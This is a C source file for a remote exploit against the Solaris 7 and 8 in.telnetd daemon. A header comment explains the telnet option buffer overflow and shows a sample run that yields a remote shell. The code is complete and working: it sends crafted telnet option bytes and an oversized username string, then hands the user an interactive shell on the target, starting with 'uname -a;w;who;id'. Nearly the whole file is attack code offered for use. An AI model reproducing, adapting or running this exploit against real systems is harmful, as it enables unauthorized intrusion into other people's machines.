/* Solaris in.telnetd <= 8.0 remote exploit
 * ========================================
 * A boundary condition error exists in telnet daemons derived from the 
 * BSD telnet daemon. Under certain circumstances, the buffer overflow 
 * can occur when a combination of telnet protocol options are received 
 * by the daemon. The function responsible for processing the options 
 * prepares a response within a fixed sized buffer, without performing 
 * any bounds checking. This exploit has been tested against Solaris 7
 * & Solaris 8 (sparc).
 *
 * Example Use.
 * localhost exploits # ./prdelka-vs-SUN-telnetd -s solaris7 -i daemon
 * [ Solaris in.telnetd <= 8.0 remote exploit
 * [ Connected to solaris7 (23/tcp)
 * [ Sent 186 bytes to target
 * ÿýÿýÿý#ÿý'ÿý$ÿþÿþÿþ#ÿþ"ÿþ$ÿýÿûÿûÿý
 * Last login: Thu Jul 20 12:53:50 from x
 * uname -a;w;who;id
 * Sun Microsystems Inc.   SunOS 5.7       Generic October 1998
 * $ SunOS solaris7 5.7 Generic_106541-04 sun4u sparc SUNW,Ultra-5_10
 *   1:04pm  up 22:48,  1 user,  load average: 0.03, 0.01, 0.02
 *   User     tty           login@  idle   JCPU   PCPU  what
 *   daemon   pts/0         1:04pm                      w
 *   daemon     pts/0        Jul 20 13:04    (192.168.0.248)
 *   uid=1(daemon) gid=1(other)
 *
 * - prdelka
 */ 
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>

char tlhdr[]="\xff\xfc\x18\xff\xfc\x1f\xff\xfc\x21\xff\xfc\x23\xff\xfb\x22\xff"
	     "\xfc\x24\xff\xfb\x27\xff\xfb\x00\xff\xfa\x27\x00\x00\x54\x54\x59"
	     "\x50\x52\x4f\x4d\x50\x54\x01\x61\x62\x63\x64\x65\x66\xff\xf0";

void dummyhandler(){
}

void shell(int sd){
	int rcv;
	char sockbuf[2048];
	fd_set readfds;
	sprintf(sockbuf, "uname -a;w;who;id\n");
	write(sd, sockbuf, strlen(sockbuf));
	while (1){		
		FD_ZERO(&readfds);
		FD_SET(0, &readfds);
		FD_SET(sd, &readfds);
		select(255, &readfds, NULL, NULL, NULL);
		if (FD_ISSET(sd, &readfds)){
			memset(sockbuf, 0, 2048);
			rcv=read(sd, sockbuf, 2048);			
			if (rcv <= 0) {
              			printf("[ Connection closed by foreign host\n");
              			exit(-1);
            		}
			printf("%s",sockbuf);
		}
      		if(FD_ISSET(0, &readfds)){
			memset(sockbuf, 0, 2048);
			read(0, sockbuf, 2048);
			write(sd, sockbuf, 2048);
        	}
    	}
}

int main (int argc, char *argv[]){
	int sd, rc, count, c, index, port=23, ihost=0;	
	char *host, *buffer, *user="bin";
	struct sockaddr_in locAddr, servAddr;
	struct hostent *h;
        static struct option options[]={
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
		{"id", 1, 0, 'i'},
		{"help", 0, 0,'h'}
        };
	printf("[ Solaris in.telnetd <= 8.0 remote exploit\n");
	while(c!=-1)
	{
	        c=getopt_long(argc,argv,"s:p:i:h",options,&index);	
        	switch(c){
        	        case 's':
				if(ihost==0){
				h = gethostbyname(optarg);
				if(h==NULL){
					printf("[ Error ");
					printf("unknown host '%s'\n",optarg);
					exit(1);
				}
				host = malloc(strlen(optarg) + 1);
				sprintf(host,"%s",optarg);
				ihost = 1;
				}
               			break;
	                case 'p':
				port = atoi(optarg);
                	        break;
			case 'i':
				user = optarg;
				break;
			case 'h':			
				printf("[ Usage instructions.\n");
				printf("[  %s",argv[0]);
				printf(" <required> (optional)\n[\n");
				printf("[   --server|-s <ip/hostname>\n[ ");
				printf("  --port|-p (port)[default 23]\n[ ");
				printf("  --id|-i (username)\n[\n");
				exit(0);
				break;
			default:
                		break;
	        }
	}
	if(ihost  != 1){
		printf("[ Error insufficient arguements");
		printf(", try running '%s --help'\n",argv[0]);
		exit(1);
	}
	signal(SIGPIPE,dummyhandler);
        servAddr.sin_family = h->h_addrtype;
	memcpy((char *)&servAddr.sin_addr.s_addr,h->h_addr_list[0],h->h_length);
	servAddr.sin_port = htons(port);
	sd = socket(AF_INET, SOCK_STREAM,0);
	if(sd<0) {
		printf("[ Cannot open socket\n");	
		exit(1);
	}
	rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
	if(rc<0) {
		printf("[ Cannot connect\n");
		exit(1);
	}
	printf("[ Connected to %s (%d/tcp)\n",host,port);
	rc = send(sd,tlhdr,47,0);
	buffer = malloc(strlen(user) + 66);
	memset(buffer,0,strlen(user) + 66);
        strncpy(buffer,user,strlen(user));
        for(count = 0;count <= 65;count++){
		strcat(buffer," M");
	}
	strcat(buffer,"\n");
	rc = rc + send(sd,buffer,strlen(buffer),0);
	printf("[ Sent %d bytes to target\n",rc);
	shell(sd);
}
